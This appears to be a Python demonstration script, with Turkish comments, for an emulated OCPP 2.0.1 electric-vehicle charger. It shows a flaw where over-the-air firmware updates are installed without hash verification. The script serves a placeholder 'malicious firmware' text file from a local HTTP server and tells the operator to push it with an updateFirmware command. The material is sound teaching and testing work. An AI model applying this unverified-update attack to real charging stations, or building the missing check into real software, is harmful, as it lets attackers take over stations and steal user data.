import sys
sys.path.append('.')

import asyncio
import logging
import http.server
import socketserver
import threading
import os
from pathlib import Path

import yaml
CONFIG_FILE = 'charging/server_config.yaml'
VERSION = 'v2.0.1'  # Varsayılan OCPP versiyonu
try:
    with open(CONFIG_FILE, "r") as file: 
        content = yaml.safe_load(file)
        if content and "version" in content:
            VERSION = content["version"]
except (yaml.YAMLError, FileNotFoundError) as e:
    print(f'Failed to parse {CONFIG_FILE}: {e}')
    print(f'Using default version: {VERSION}')

from charging.client import launch_client, ChargePointClientBase, wait_for_button_press

logging.basicConfig(level=logging.ERROR)

# Malicious firmware içeriği
MALICIOUS_FIRMWARE_CONTENT = b"""
=== MALICIOUS FIRMWARE ===
Bu firmware, hash doğrulaması zaafiyetinden yararlanarak yükleniyor.
Bu firmware ile saldırganlar:
1. Charging station'ı kontrol edebilir
2. Kullanıcı verilerini çalabilir
3. Şarj süreçlerini manipüle edebilir
4. Backdoor ekleyebilir
==========================
"""

# HTTP server için basit handler
class FirmwareHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/firmware.bin' or self.path == '/malicious_firmware.bin':
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-length', str(len(MALICIOUS_FIRMWARE_CONTENT)))
            self.end_headers()
            self.wfile.write(MALICIOUS_FIRMWARE_CONTENT)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

def start_firmware_server(port=8080):
    """Malicious firmware dosyasını servis eden HTTP server başlat"""
    handler = FirmwareHandler
    httpd = socketserver.TCPServer(("", port), handler)
    print(f"[*] Malicious firmware server başlatıldı: http://localhost:{port}/malicious_firmware.bin")
    httpd.serve_forever()

# ID of the RFID token used to authenticate
RFID_TOKEN = '1122334455667788'
TOKEN_TYPE = 'ISO15693'


# OTA Hash Zaafiyeti Saldırı Senaryosu:
#   1. Client normal şekilde bağlanır
#   2. Saldırgan server'dan UpdateFirmware mesajı gönderir
#   3. Client firmware'ı indirir ama hash doğrulaması YAPMAZ
#   4. Malicious firmware yüklenir
async def ota_hash_vulnerability_scenario(cp: ChargePointClientBase):
    cp.print_message('=== OTA HASH ZAAFİYETİ SALDIRI SENARYOSU ===')
    cp.print_message('Client server\'a bağlandı')
    cp.print_message('⚠️  ZAAFİYET: Hash doğrulaması yapılmıyor!')
    cp.print_message('Saldırgan malicious firmware gönderebilir...')
    
    await wait_for_button_press('Server\'dan firmware güncelleme isteği gönderin (operator websocket: updateFirmware <serial> <url>)')
    
    cp.print_message('Firmware güncelleme isteği bekleniyor...')
    cp.print_message('Not: Bu senaryoda server tarafından UpdateFirmware mesajı gönderilmesi gerekiyor.')
    cp.print_message('Operator websocket üzerinden: updateFirmware E2507-8420-1274 http://localhost:8080/malicious_firmware.bin')


if __name__ == "__main__":
    # Firmware server'ı ayrı thread'de başlat
    firmware_server_thread = threading.Thread(target=start_firmware_server, args=(8080,), daemon=True)
    firmware_server_thread.start()
    
    # Malicious firmware dosyasını oluştur
    firmware_dir = Path('./charging/firmware_server')
    firmware_dir.mkdir(parents=True, exist_ok=True)
    firmware_path = firmware_dir / 'malicious_firmware.bin'
    with open(firmware_path, 'wb') as f:
        f.write(MALICIOUS_FIRMWARE_CONTENT)
    
    print("=" * 60)
    print("OTA HASH ZAAFİYETİ SALDIRI SENARYOSU")
    print("=" * 60)
    print("\n[!] Bu senaryo, OTA güncellemelerinde hash doğrulaması")
    print("    zaafiyetini göstermek için tasarlanmıştır.\n")
    print("[*] Firmware server başlatıldı: http://localhost:8080/malicious_firmware.bin")
    print("[*] Client başlatılıyor...\n")
    print("[*] Senaryo adımları:")
    print("    1. Client server'a bağlanır")
    print("    2. Operator websocket'e bağlanın (ws://localhost:9008)")
    print("    3. Şu komutu gönderin:")
    print("       updateFirmware E2507-8420-1274 http://localhost:8080/malicious_firmware.bin")
    print("    4. Client firmware'ı indirir ve hash doğrulaması YAPMADAN yükler")
    print("=" * 60)
    print()

    # Client config - OCPP 2.0.1 kullanmak için index=0 kullanıyoruz
    # client_config.yaml dosyasındaki profile 0 (OCPP201, SP=1) kullanılacak
    try:
        asyncio.run(launch_client(
            vendor_name='EmuOCPPCharge',
            model='E2507',
            index=0,  # OCPP 2.0.1, Security Profile 1
            async_runnable=ota_hash_vulnerability_scenario
        ))
    except KeyboardInterrupt:
        print("\n[*] Senaryo sonlandırıldı")